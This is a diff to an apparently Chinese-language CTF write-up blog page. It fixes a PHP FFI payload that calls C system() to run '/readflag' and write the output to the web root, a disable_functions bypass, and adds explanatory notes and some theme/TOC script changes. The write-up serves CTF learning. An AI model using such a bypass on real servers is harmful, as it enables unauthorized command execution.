@@ -1092,13 +1092,19 @@ if($b&#x3D;opendir($a))&#123;
 </ul>
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsat3pnlxkj304r09imxh.jpg" alt="image-20210709170431866"></p>
 <ul>
-<li>第二个为有效的<code>flag</code>文件</li>
+<li><p>第二个为有效的<code>flag</code>文件</p>
+</li>
+<li><p><code>FFI</code>是<code>php</code>扩展，允许在<code>PHP</code>语句中使用<code>C语言</code>，返回值是<code>FFI</code>对象.<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ffi.new.php">FFI官方链接</a></p>
+</li>
 </ul>
 <p>Payload：</p>
-<pre class="line-numbers language-none"><code class="language-none">$ffi&#x3D;FFI::cdef(&quot;int system(const char *command);&quot;);
-$a &#x3D; &#39;&#x2F;readflag &gt; &#x2F;var&#x2F;www&#x2F;html&#x2F;1.txt&#39;;
-$ffi-&gt;sysytem($a);exit();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$ffi</span><span class="token operator">=</span><span class="token class-name static-context">FFI</span><span class="token operator">::</span><span class="token function">cdef</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"int system(const char *command);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/readflag > /var/www/html/1.txt'</span><span class="token punctuation">;</span>
+<span class="token variable">$ffi</span><span class="token operator">-></span><span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
+<ul>
+<li><code>system()</code>函数用于向操作系统传递控制台命令行/</li>
+</ul>
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsat95bvpnj30wu0iwq4w.jpg" alt="image-20210709170945380"></p>
 <h2 id="web118"><a href="#web118" class="headerlink" title="web118"></a>web118</h2><h3 id="系统命令的另一种绕过方式："><a href="#系统命令的另一种绕过方式：" class="headerlink" title="系统命令的另一种绕过方式："></a>系统命令的另一种绕过方式：</h3><ul>
 <li>在环境变量中挑选字母构成命令，执行语句</li>
@@ -1866,12 +1872,6 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
 
 <!-- TOC 悬浮按钮. -->
 
-<div id="floating-toc-btn" class="hide-on-med-and-down">
-    <a class="btn-floating btn-large bg-color">
-        <i class="fas fa-list-ul"></i>
-    </a>
-</div>
-
 
 <script src="/libs/tocbot/tocbot.min.js"></script>
 <script>
@@ -1880,7 +1880,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             tocSelector: '#toc-content',
             contentSelector: '#articleContent',
             headingsOffset: -($(window).height() * 0.4 - 45),
-            collapseDepth: Number('1'),
+            collapseDepth: Number('0'),
             headingSelector: 'h2, h3, h4'
         });
 
@@ -1910,41 +1910,6 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             }
         });
 
-        
-        /* 修复文章卡片 div 的宽度. */
-        let fixPostCardWidth = function (srcId, targetId) {
-            let srcDiv = $('#' + srcId);
-            if (srcDiv.length === 0) {
-                return;
-            }
-
-            let w = srcDiv.width();
-            if (w >= 450) {
-                w = w + 21;
-            } else if (w >= 350 && w < 450) {
-                w = w + 18;
-            } else if (w >= 300 && w < 350) {
-                w = w + 16;
-            } else {
-                w = w + 14;
-            }
-            $('#' + targetId).width(w);
-        };
-
-        // 切换TOC目录展开收缩的相关操作.
-        const expandedClass = 'expanded';
-        let $tocAside = $('#toc-aside');
-        let $mainContent = $('#main-content');
-        $('#floating-toc-btn .btn-floating').click(function () {
-            if ($tocAside.hasClass(expandedClass)) {
-                $tocAside.removeClass(expandedClass).hide();
-                $mainContent.removeClass('l9');
-            } else {
-                $tocAside.addClass(expandedClass).show();
-                $mainContent.addClass('l9');
-            }
-            fixPostCardWidth('artDetail', 'prenext-posts');
-        });
         
     });
 </script>
